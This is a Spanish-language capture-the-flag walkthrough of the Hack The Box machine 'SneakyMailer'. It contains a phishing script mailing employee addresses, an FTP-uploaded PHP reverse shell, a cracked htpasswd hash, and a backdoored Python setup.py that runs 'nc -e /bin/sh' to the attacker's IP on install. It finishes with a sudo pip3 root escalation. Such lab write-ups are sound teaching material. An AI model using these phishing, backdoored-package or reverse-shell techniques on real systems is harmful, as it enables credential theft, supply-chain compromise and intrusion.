---
title: SneakyMailer
author: OxDeed
date: 2020-12-4 15:17:00 -0300
tags: [smtp,phishing,medium,hackthebox,gtfobins]
math: true
image: /htb/sneakymailer/sneakymailer.png

---

## Resumen:

`SneakyMailer` es una máquina nivel intermedio bastante interesante. Con el primer barrido de nmap encontraremos un nuevo dominio `sneakycorp.htb` que en su sitio web contiene numerosos `emails` los cuales tendremos que hacerles un ataque de `phishing` para obtener el password que usaremos en el servidor `smtp`.

Luego de revisar los correos encontramos otras credenciales, que usaremos en el servidor `FTP`. Nos damos cuenta que podemos subir un reverse shell php y así alcanzar el RCE, pero con otro dominio que tuvimos que encontrar haciendo fuzzing `dev.sneakycorp.htb`. 

Entramos como `www-data` y nos topamos con un hash del `pypiserver`. Lo que hicimos fue subir un paquete con nuestro payload al servidor que nos sirvió para conseguir el user.txt como low. 

Lo próximo que hicimos para obtener nuestro preciado root.txt fue bastante sencillo, ya que podemos ejecutar pip3 como sudo, y usando las técnicas de `gtfobins` somos capaces de escalar hacia ¡`Root`!.

---

## Pwned
<link rel="stylesheet" type="text/css" href="/assets/css/asciinema-player.css"/>
<asciinema-player src="/htb/sneakymailer/root.cast" cols="107" rows="24"></asciinema-player>
<script type="text/javascript" src="/assets/js/asciinema-player.js"></script>

---

## Reconocimiento

Acá nos damos cuenta de varias cosas bastante útiles, la primera es que está corriendo los servicios ftp y un servidor de correos, además descubrimos un dominio **sneakycorp.htb**. Y el puerto 8080 que por ahora no sabemos que es lo que está corriendo. ¡Sigamos!

```console

Nmap scan report for 10.10.10.197
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: IDLE ENABLE SORT OK ACL QUOTA IMAP4rev1 THREAD=ORDEREDSUBJECT THREAD=REFERENCES CAPABILITY NAMESPACE UTF8=ACCEPTA0001 completed CHILDREN STARTTLS ACL2=UNION UIDPLUS
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: IDLE ENABLE SORT OK ACL AUTH=PLAIN QUOTA IMAP4rev1 THREAD=ORDEREDSUBJECT THREAD=REFERENCES CAPABILITY NAMESPACE UTF8=ACCEPTA0001 completed CHILDREN ACL2=UNION UIDPLUS
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Ok, agregamos el nuevo dominio al archivo hosts y exploramos un poco a ver que nos encontramos.

```console
kali@kali:~$ sudo nano /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.197    sneakycorp.htb
```

En la sección de team `http://sneakycorp.htb/team.php` nos vamos a encontrar con un montón de cuentas emails con el siguiente dominio `sneakymailer.htb`
lo agregamos también a el archivo hosts. 

```console
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.197    sneakycorp.htb sneakymailer.htb
```
Podemos extraer fácilmente las cuentas de correos con esta aplicación. [**email-checker**](https://email-checker.net/extract-email)
Hacemos ctrl + a 
copiamos, pegamos en la herramienta y extraemos.
![Desktop View](/htb/sneakymailer/email3.png)

Lo guardamos todo en un archivo llamado emails.txt

![Desktop View](/htb/sneakymailer/saved_emails.png)

Lo que vamos a hacer ahora es probar si podemos mandar correos a esos usuarios, con una herramienta llamada [**Swaks**](https://github.com/jetmore/swaks) ***(Swiss Army Knife for SMTP).***

```console
./swaks --from "testing@sneakymailer.htb" --body "Prueba" --to tigernixon@sneakymailer.htb
```

```console
=== Trying sneakymailer.htb:25...
=== Connected to sneakymailer.htb.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO kali
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<testing@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<tigernixon@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Fri, 04 Dec 2020 10:06:00 -0500
 -> To: tigernixon@sneakymailer.htb
 -> From: testing@sneakymailer.htb
 -> Subject: test Fri, 04 Dec 2020 10:06:00 -0500
 -> Message-Id: <20201204100600.004459@kali>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Prueba
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 9F84324961
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```
Perfecto el correo se envió exitosamente. 

---

## Phishing a los empleados

Podemos automatizar esta tarea haciendo un script en python para poder enviarle el phishing a cada usuario. Entonces nuestro código sería algo así: 

```python
#!/usr/bin/env python                               
import os
def leer_emails(archivo):
	return [item.replace("\n", "") for item in open(archivo).readlines()]
lista_emails = leer_emails("emails.txt")
n = 1

for emails in lista_emails:
	print "\n[{}] -- Enviando Phishing a [{}]".format(n,emails) 
	comando = 'swaks -from "ceo@sneakymailer.htb" -body " http://10.10.14.63:8080" --to ' + emails + " -server 10.10.10.197 -header 'Subject: Importante' > /dev/null " 
	os.system(comando)
	n+=1

```

Nos ponemos a la escucha en el puerto `8080` para capturar cualquier respuesta.

```console
kali@kali:~$ nc -lvnp 8080
listening on [any] 8080 ...
```
Muy bien, parece que paulbyrd accedió al link. 
<asciinema-player src="/htb/sneakymailer/email.cast" cols="100" rows="20"></asciinema-player>

```console
firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```
Decodeamos el passowrd con  [**urldecoder**](https://www.urldecoder.org/) y ya con esto ya tendríamos nuestras primeras credenciales ``paulbyrd:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht``

---

## IMAP

Ya que las credenciales no funcionaron  con el ftp lo que hice fue intentar acceder al servidor imap en el puerto 143 y revisar si existe alguna información valiosa en los correos.

```console
kali@kali:~$ nc sneakycorp.htb 143
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
```
``0 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht``
```console
kali@kali:~$ nc sneakycorp.htb 143
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
0 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
0 OK LOGIN Ok.
```

`1 list "" *`

```console
1 list "" *
* LIST (\Unmarked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
1 OK LIST completed
```

Tenemos 2 correos en "Inbox/Sent Items" veamos que hay dentro.

`02 SELECT "INBOX.Sent Items"`

```console
02 SELECT "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
02 OK [READ-WRITE] Ok
```

Email 1: En este correo conseguimos otras credenciales que probablemente funcionaran en el servidor ftp.

`03 FETCH 1 BODY[]`

```console
03 fetch 1 BODY[]
* 1 FETCH (BODY[] {2167}
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
        boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20

Hello administrator, I want to chang=
e this password for the developer account
Username: developer Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do i=

03 OK FETCH completed.
```

Email 2: Este email es bastante interesante, seguro nos servirá para más tarde. 

`03 FETCH 2 BODY[]`

```console
03 fetch 2 body[]
* 2 FETCH (BODY[] {585}
To: low@debian
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Module testing
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
Date: Wed, 27 May 2020 13:28:58 -0400
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

Hello low


Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.

)
03 OK FETCH completed.
 ```
---

## FTP

FTP Credenciales: `Username: developer Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`


```console
ftp> cd dev
250 Directory successfully changed.
ftp> put file.txt
local: file.txt remote: file.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp> 
 ```
Somos capaces de subir archivos al servidor, pero no lo encontramos cuando hacemos `dir` por lo tanto probablemente el directorio `dev` este oculto en otro host.

```console
 ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
 ```

Intente subir una reverse shell y acceder a través de http://sneakycorp.htb/0xdeed.php pero no estaba ahi, por lo tanto llegue a la conclusión de que debe estar en otro dominio o subdominio. 

## Fuzzing Host 

Utilizamos wfuzz para encontrar el subdominio, y tal como esperábamos es `dev.sneakycorp.htb`.
```console
wfuzz -H "HOST: FUZZ.sneakycorp.htb" -u http://10.10.10.197/ -w /usr/share/wordlists/dirb/common.txt --hh 173,185
```

```console
kali@kali:~$ wfuzz -H "HOST: FUZZ.sneakycorp.htb" -u http://10.10.10.197/ -w /usr/share/wordlists/dirb/common.txt --hh 173,185

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.197/
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload             
===================================================================

000001241:   200        340 L    989 W    13737 Ch    "dev"
 ```

Agregamos a nuestro archivo hosts. 

```console
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.197    sneakycorp.htb sneakymailer.htb  dev.sneakycorp.htb
```

Y ahora accedemos al servidor ftp con el nuevo subdominio y comprobamos que ahora si podemos acceder al archivo y por lo tanto obtener nuestra shell.

---

## LFI TO RCE 

```console
kali@kali:~$ ftp dev.sneakycorp.htb
Connected to sneakycorp.htb.
220 (vsFTPd 3.0.3)
Name (dev.sneakycorp.htb:kali): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Utilizamos el  [**php_reverse_shell**](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) de pentestmonkey remplazamos la ip a la nuestra y el puerto donde estaremos a la escucha.

```console
ftp> put 0xdeed.php 
```
Como podemos observar ahora si podemos encontrar nuestro backdoor. 
```console
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
--wxrw-rw-    1 1001     1001         5493 Dec 04 11:44 0xdeed.php
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
```

---

## User.txt
triggereamos en `http://dev.sneakycorp.htb/0xdeed.php` y ¡Listo! tenemos la primera shell. 

```console
kali@kali:~$ nc -lvnp 4949
listening on [any] 4949 ...
connect to [10.10.14.63] from (UNKNOWN) [10.10.10.197] 56796
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 11:45:54 up 10:38,  0 users,  load average: 0.02, 0.05, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Podemos hacer un `su` hacia el usuario developer con las mismas credenciales
```console
www-data@sneakymailer:/$ su developer
Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
developer@sneakymailer:/$ 
```
### Enumeración
Al rato de echar un vistazo y enumerar me encuentro con los siguientes usuarios:

```console
vmail:x:5000:5000::/home/vmail:/usr/sbin/nologin
developer:x:1001:1001:,,,:/var/www/dev.sneakycorp.htb:/bin/bash
pypi:x:998:998::/var/www/pypi.sneakycorp.htb:/usr/sbin/nologin
low:x:1000:1000:,,,:/home/low:/bin/bash
developer@sneakymailer:/$ 
```

Me llamo mucho la atención el usuario pypi con el dominio `pypi.sneakycorp.htb` normalmente el servidor pypi corre en el puerto `8080`, ahora sabemos qué servicio es. 

```console
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.197    sneakycorp.htb sneakymailer.htb pypi.sneakycorp.htb dev.sneakycorp.htb
```

![Desktop View](/htb/sneakymailer/pipy.png)

---

Para seguir avanzando tire un linenum.sh para ver si encontraba algo, y efectivamente encontramos el hash del usuario pypi 
```console
htpasswd
[-] htpasswd found - could contain passwords:                                                            
/var/www/pypi.sneakycorp.htb/.htpasswd                                                                   
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```
---

```console
root@kali:/home/kali# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
soufianeelhaoui  (pypi)
1g 0:00:00:20 DONE (2020-12-04 11:59) 0.04764g/s 170284p/s 170284c/s 170284C/s souheib2..souderton16
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

OK, tenemos la contraseña de el usuario `pypi:soufianeelhaoui`. Antes de continuar hagamos una pausa y recordemos lo que decía el segundo email que encontramos en imap

```console
Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
```

Básicamente lo que le está diciendo a low es que su tarea es probar y borrar cada módulo de python que encuentre en el servicio PyPi que está corriendo en el puerto 8080. 
Y esto es bastante curioso, porque podríamos crear un paquete, subirlo y low deberá probarlo. Entonces lo que haremos es meter nuestro payload en ese paquete maligno, para conseguir la shell como low.

Luego de leer un poco la documentación podemos ponernos manos a la obra. [**pipyserver**](https://pypi.org/project/pypiserver/)

Necesitaremos crear 2 archivos esenciales

`.pypirc`: Este archivo almacena inicios de sesión y contraseñas para autenticar sus cuentas. Normalmente se almacena en su directorio personal.

`setup.py`: Aquí ira nuestro código malicioso.

![Desktop View](/htb/sneakymailer/pyprc.png)

```console
[distutils]
	index-servers = sneakycorp
	[sneakycorp]
	repository: http://pypi.sneakycorp.htb:8080
	username: pypi
	password: soufianeelhaoui

```

```python
#!/usr/bin/python3
import setuptools
import os

comando = os.system('nc -e /bin/sh 10.10.14.63 4848')

with open("README.md", "r") as fh:
    long_description = fh.read()

setuptools.setup(
    name="alto_backdoor", # Replace with your own username
    version="0.0.1",
    author="0xdeed",
    author_email="author@example.com",
    description="A small example package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)

```
Nos ponemos a la escucha en nuestra máquina:
```console
python3 -m http.server 4242
```
Y Descargamos los archivos en la máquina de la víctima

```console
wget 10.10.14.63:4242 -r

10.10.14.63:4242/.p 100%[===================>]     138  --.-KB/s    in 0s      

2020-12-04 12:15:15 (24.3 MB/s) - ‘10.10.14.63:4242/.pypirc’ saved [138/138]

10.10.14.63:4242/se 100%[===================>]     748  --.-KB/s    in 0.003s  

2020-12-04 12:15:15 (251 KB/s) - ‘10.10.14.63:4242/setup.py’ saved [748/748]
```

```console
developer@sneakymailer:~$ ls -la
ls -la
total 16
drwxrwxrwx 2 developer developer 4096 Dec  4 12:15 .
drwxrwxrwx 3 developer developer 4096 Dec  4 12:15 ..
-rw-rw-rw- 1 developer developer  138 Dec  4 12:13 .pypirc
-rw-rw-rw- 1 developer developer  748 Dec  4 12:13 setup.py
developer@sneakymailer:~$ 
```
Tenemos los dos archivos, ahora podemos subirlos usando el siguiente comando: `python3 setup.py sdist upload -r sneakycorp`
```console
kali@kali:~/Documents/hackthebox/sneakymailer/paquete$ nc -lvnp 4848
listening on [any] 4848 ...
connect to [10.10.14.63] from (UNKNOWN) [10.10.10.197] 35494
whoami
developer
```
Obtenemos el reverse shell pero aun somos developer, porque se esta ejecutando 2 veces primero como developer y luego low lo ejecuta, como solo queremos que low sea el que lo ejecute hagamos un pequeño truco, sabemos que el uid del usuario low es 1000, entonces el comando solo se ejecutara si el uid corresponde con el de low.

```python
#!/usr/bin/python3
import setuptools
import os

if os.getuid() == 1000:
	comando = os.system('nc -e /bin/sh 10.10.14.63 4848')

with open("README.md", "r") as fh:
    long_description = fh.read()

setuptools.setup(
    name="alto_backdoor", # Replace with your own username
    version="0.0.1",
    author="0xdeed",
    author_email="author@example.com",
    description="A small example package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)

```
subimos con el siguiente comando: 
```console
python3 setup.py sdist register -r sneakycorp upload -r sneakycorp
```
Nos ponemos a la escucha y obtenemos el shell como low.
```console
kali@kali:~$ nc -lvnp 4848
listening on [any] 4848 ...
connect to [10.10.14.63] from (UNKNOWN) [10.10.10.197] 37728
whoami
low
```
Para trabajar de manera más cómoda lo que hice fue usar el authorized_key para poder logearme sin password usando mi llave publica de ssh
```console
low@sneakymailer:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpgc1wqbZzNPSqfx/IePt0CU0e3yDPt5OAKTkAMmpGCy8BH/pRa1RqGPHm6uI2j0i7mEwnKElcqQRllUwDltLY17mmJp+GdxAqJq8QJpCHY+1fujuONJgok5DR8pCrJW4RbydM0Xvn3c8wmduxN/cbfXuHjCT8bc+UzzQ3yaFdBnkLmuZIYbVtWZ3T9UPQlBSHow4lGpm+2ahxmXBhgNTOg8udPzH+eJxSx2dShdLGbf1VJjVX92sqt0MuT7wmSBqdTFk8B4Isc0XamT1SCu50OGTUT0dMfXKyGuQ2rcXozCKvaLBfclvp09edGw28iJIfQHbrh89IdQALvZZc1nTuOvFm3HXAPJJQ+lghYrzbvWIXgypSwLC4Gr57O4cBXcTembHcTQYPqa5UYK/2EKep/u/oYgJUhntspI+jyG7n0ioNKduDSFDu1OdVHS0rOh7TpywMU7eyCHZ1iDNPZ7+c7TZd8Ooh9mrYdRwaOEUYw2bNm2Rb0RGtNa6LgTR0dLU= kali@kali" > authorized_keys
```

<asciinema-player src="/htb/sneakymailer/user.cast" cols="107" rows="24"></asciinema-player>
---

## root.txt

Lo primero que hice fue tirar un `sudo -l` 
```console
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
 ```
### GTFObins pip3
Y para mi sorpresa podemos ejecutar pip3 como root. Busque en los gtfobins a ver si podemos bypassear el pip3 para obtener la shell y efectivamente podemos [**pip3 gtfobins**]( https://gtfobins.github.io/gtfobins/pip/)

Lo que vamos a hacer es muy sencillo solo seguiremos los pasos, en la maquina de sneakymailer vamos a ejecutar lo siguiente:

```console
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF 
 ```

<asciinema-player src="/htb/sneakymailer/root.cast" cols="107" rows="24"></asciinema-player>
---

![Desktop View](/htb/sneakymailer/sneaky.gif)

---

## Recursos 

| Topics                      | 
|:-----------------------------|
| [**Comandos IMAP**](https://k9mail.app/documentation/development/imapExtensions.html)         |
| [**PyPi Server**](https://pypi.org/project/pypiserver/)              | 
| [**GTFOBINS pip3**](https://gtfobins.github.io/gtfobins/pip/) | 
